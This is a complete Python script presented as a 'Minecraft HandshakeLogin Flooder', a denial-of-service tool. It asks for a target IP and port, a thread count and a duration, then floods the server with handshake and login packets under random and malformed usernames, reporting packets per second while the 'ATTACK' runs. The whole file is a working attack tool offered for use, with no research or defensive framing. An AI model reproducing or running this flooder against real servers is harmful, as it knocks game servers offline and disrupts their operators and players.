import sys
import socket
import threading
import time
import random
import requests
import os
from struct import pack as p
from colorama import Fore, init

init(autoreset=True)

sent_packets = 0
fail_packets = 0
pps = 0
mbps = 0.0

lock = threading.Lock()
pps_lock = threading.Lock()

USR = "̸̧̡̡̛̹̝̤̲̯̗̣̪̣͇̻̲̃͑ͨ̽͋̆ͦ̃̇̒ͭ͢͞͡ͅ‭"

VER = {
    "1.0.0": 22, "1.1.0": 23, "1.2.2": 28, "1.2.4": 29, "1.3.1": 39, "1.4.2": 47,
    "1.4.3": 48, "1.4.4": 49, "1.4.6": 51, "1.5.0": 60, "1.5.2": 61, "1.6.0": 72,
    "1.6.1": 73, "1.6.2": 74, "1.6.4": 78, "1.7.1": 4, "1.7.6": 5, "1.8.0": 47,
    "1.9.0": 107, "1.9.2": 109, "1.9.4": 110, "1.10.0": 210, "1.11.0": 315,
    "1.11.1": 316, "1.12.0": 335, "1.12.1": 338, "1.12.2": 340, "1.13.0": 393,
    "1.13.1": 401, "1.13.2": 404, "1.14.0": 477, "1.14.1": 480, "1.14.2": 485,
    "1.14.3": 490, "1.14.4": 498, "1.15.0": 573, "1.15.1": 575, "1.15.2": 578,
    "1.16.0": 735, "1.16.1": 736, "1.16.2": 751, "1.16.3": 753, "1.16.4": 754,
    "1.16.5": 754, "1.17.0": 755, "1.17.1": 756, "1.18.0": 757, "1.18.1": 757,
    "1.18.2": 758, "1.19.0": 759, "1.19.1": 760, "1.19.2": 760, "1.19.3": 761,
    "1.19.4": 762, "1.20.0": 763, "1.20.2": 764, "1.20.3": 765, "1.20.4": 765,
    "1.20.5": 766, "1.21": 767, "1.21.1": 767, "1.21.2": 768, "1.21.4": 769,
    "1.21.5": 770, "1.21.6": 771, "1.21.7": 772, "1.21.8": 772
}

def interpolate_color(c1, c2, t):
    return tuple(
        int(c1[i] + (c2[i] - c1[i]) * t)
        for i in range(3)
    )

def vertical_gradient_text(lines, colorss):
    n = len(lines)
    output = []
    segs = len(colorss) - 1
    seg_length = n / segs
    
    for i, line in enumerate(lines):
        seg_index = min(int(i // seg_length), segs - 1)
        t = (i - seg_index * seg_length) / seg_length
        color = interpolate_color(colorss[seg_index], colorss[seg_index + 1], t)
        r, g, b = color
        colored_line = f"\033[38;2;{r};{g};{b}m{line}\033[0m"
        output.append(colored_line)
    return output

box_lines = [
    " _____  _____   _________        __        ___  ____                      ",
    "|_   _||_   _| |_   ___  |      /  \\      |_  ||_  _|                    ",
    "  | | /\\ | |     | |_  \\_|     / /\\ \\       | |_/ /                   ",
    "  | |/  \\| |     |  _|  _     / ____ \\      |  __'.                     ",
    "  |   /\\   |    _| |___/ |  _/ /    \\ \\_   _| |  \\ \\_  _             ",
    "  |__/  \\__|   |_________| |____|  |____| |____||____|(_)                ",
    "═══════════════╦═════════════════════╦══════════════════                  ",
    "               ║                     ║                                    ",
    "           ╔═══╩═════════════════════╩════════╗                           ",
    "           ║    STAND AND DONT FALL BACK.     ║                           ",
    "           ╠══════════════════════════════════╣                           ",
    "           ║ Minecraft HandshakeLogin Flooder ║                           ",
    "           ╠══════════════════════════════════╣                           ",
    "           ║     DC: anpersonthatperson       ║                           ",
    "           ╚══════════════════════════════════╝                           ",
]

blue = (0, 0, 139)
cyan = (0, 255, 255)
white = (255, 255, 255)

colorss = [white, cyan, blue]

gradient_lines = vertical_gradient_text(box_lines, colorss)

def get_proto(version):
    if version.isdigit():
        return int(version)
    if version in VER:
        return VER[version]
    if '.' in version:
        parts = version.split('.')
        joined = '.'.join(parts[:2])
        return VER.get(joined)
    return None

def vi(n):
    out = b''
    while True:
        b = n & 0x7F
        n >>= 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            break
    return out

def encode_packet(*args):
    data = b''.join(args)
    return vi(len(data)) + data

def short(port):
    return p(">H", port)

def handshake_packet(ip, port, proto):
    return encode_packet(
        vi(0x00),
        vi(proto),
        encode_packet(ip.encode()),
        short(port),
        vi(2)
    )

def login_packet(proto, username):
    pid = 0x00 if proto >= 391 else 0x01
    return encode_packet(vi(pid), encode_packet(username))

def generate_username():
    choice = random.randint(1, 6)
    if choice == 1:
        return f"diddy{random.randint(1000, 9999)}".encode('ascii')
    elif choice == 2:
        return f"wowisthatmysigmaboy_{random.randint(10000, 99999)}".encode()
    elif choice == 3:
        return random.choice(['A', 'Z']).encode()
    elif choice == 4:
        return b"\x00" + str(random.randint(0, 9)).encode()
    elif choice == 5:
        return "?!@#$%^&*(){}:<>?/\\`".encode()
    elif choice == 6:
        return USR.encode('utf-8')
    return b"fallbackusr"

def check_server_online_via_api(ip, port):
    if ip == "127.0.0.1":
        print(Fore.GREEN + f"[*] Skipping API check for localhost {ip}:{port}", flush=True)
        return True
    
    tiap = f"{ip}:{port}"
    url = f"https://api.mcsrvstat.us/3/{tiap}"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        data = response.json()
        if data.get("online") is True:
            print(Fore.GREEN + f"[*] Api check: server {tiap} is online.", flush=True)
            return True
        else:
            print(Fore.RED + f"[*] Api check: server {tiap} is offline.", flush=True)
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Api check failed: {e}", flush=True)
        return False

def validate_handshake_login(ip, port, proto):
    try:
        s = socket.socket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(3)
        s.connect((ip, port))

        uname = generate_username()
        handshake = handshake_packet(ip, port, proto)
        login = login_packet(proto, uname)

        s.sendall(handshake)
        s.sendall(login)

        try:
            data = s.recv(1024)
            if data:
                s.close()
                print(Fore.GREEN + "[*] Handshake + Login response received. Server confirmed online and responsive.", flush=True)
                return True
            else:
                s.close()
                print(Fore.RED + "[*] No response data received after handshake+login. Server might be offline or not responding properly.", flush=True)
                return False
        except socket.timeout:
            s.close()
            print(Fore.RED + "[*] Timeout waiting for server response after handshake+login.", flush=True)
            return False

    except Exception as e:
        print(Fore.RED + f"[!] Exception during handshake+login validation: {e}", flush=True)
        return False

def send_handshake_and_login(ip, port, proto):
    global sent_packets, fail_packets, pps, mbps
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(3)
        s.connect((ip, port))

        uname = generate_username()
        handshake = handshake_packet(ip, port, proto)
        login = login_packet(proto, uname)

        s.sendall(handshake)
        s.sendall(login)

        try:
            data = s.recv(1024)
            if data:
                with lock:
                    sent_packets += 2
                with pps_lock:
                    pps += 2
                    mbps += (len(handshake) + len(login)) / (1024 * 1024)
            else:
                with lock:
                    fail_packets += 1
        except socket.timeout:
            with lock:
                fail_packets += 1

        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()

    except Exception as e:
        if getattr(e, 'winerror', None) == 10054:
            print(Fore.RED + "server didn't respond to handshake and login packets, exiting..", flush=True)
        else:
            with lock:
                fail_packets += 1
            print(Fore.RED + f"\n[!] Exception: {e}", flush=True)

def spammer(ip, port, proto, end_time):
    while time.time() < end_time:
        send_handshake_and_login(ip, port, proto)
        time.sleep(0.01)

def monitor(end_time):
    global pps, mbps
    while time.time() < end_time:
        time.sleep(1)
        with pps_lock:
            print(f"\r{Fore.YELLOW}[PPS] {pps:<6} | [MBPS] {mbps:.2f} MB/s | {Fore.CYAN}Total Sent: {sent_packets:<7}", end='', flush=True)
            pps = 0
            mbps = 0.0

def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

def main():
    global sent_packets, fail_packets, pps, mbps

    try:
        if len(sys.argv) >= 5:
            target = sys.argv[1]
            threads = int(sys.argv[2])
            duration = int(sys.argv[3])
            version = sys.argv[4]

            if version not in VER:
                print(Fore.RED + f"❌ Unsupported version '{version}'.", flush=True)
                return

            protocol_version = VER[version]

        else:
            clear()
            for line in gradient_lines:
                print(line)

            target = input(Fore.RED + "Target [IP:PORT]: ").strip()

            threads_input = input(Fore.RED + "Threads (max 100): ").strip()
            if not threads_input.isdigit() or int(threads_input) > 100 or int(threads_input) < 1:
                print(Fore.LIGHTRED_EX + "❌ Invalid threads.")
                return
            threads = int(threads_input)

            duration_input = input(Fore.RED + "Duration (in seconds, max 3600): ").strip()
            if not duration_input.isdigit() or int(duration_input) > 3600 or int(duration_input) < 1:
                print(Fore.LIGHTRED_EX + "❌ Invalid duration.")
                return
            duration = int(duration_input)

            while True:
                version = input(Fore.RED + "Version: ").strip()
                if version in VER:
                    protocol_version = VER[version]
                    break
                else:
                    print(Fore.LIGHTRED_EX + f"❌ Unknown '{version}'. Available: " + ", ".join(sorted(VER.keys())))
                    time.sleep(1.5)

        if ':' in target:
            ip, port = target.split(':')
            port = int(port)
        else:
            ip = target
            port = 25565

        print(Fore.GREEN + f"[*] Starting ATTACK | Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s | Protocol: {protocol_version}", flush=True)

        stop_time = time.time() + duration

        threading.Thread(target=monitor, args=(stop_time,), daemon=True).start()

        for _ in range(threads):
            threading.Thread(target=spammer, args=(ip, port, protocol_version, stop_time), daemon=True).start()

        while time.time() < stop_time:
            time.sleep(0.2)

        print("\n" + Fore.GREEN + "[*] ATTACK FINISHED.", flush=True)
        print(Fore.CYAN + f"[+] Valid Packets Sent: {sent_packets}", flush=True)
        print(Fore.RED + f"[+] Failed Packets Sent: {fail_packets}", flush=True)

    except Exception as e:
        print(Fore.RED + f"\n[ERROR]: {e}", flush=True)

if __name__ == "__main__":
    main()